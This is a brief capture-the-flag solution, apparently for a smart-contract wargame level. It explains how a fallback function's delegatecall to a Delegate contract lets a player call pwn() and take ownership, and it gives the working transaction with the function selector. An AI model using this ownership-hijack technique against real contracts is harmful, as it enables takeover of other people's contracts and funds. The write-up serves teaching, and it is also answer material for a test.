# Answer

Goal: Claim ownership of the contract.

## 1. Becoming the owner

The contract has a fallback function which calls Delegate contract using delegatecall. In turn Delegate contract has owner overriding function. I think you know where we are going with this:

```js
sendTransaction({
  to: contract.address,
  from: player,
  data: '0xdd365b8b', // pwn() function selector
})
```

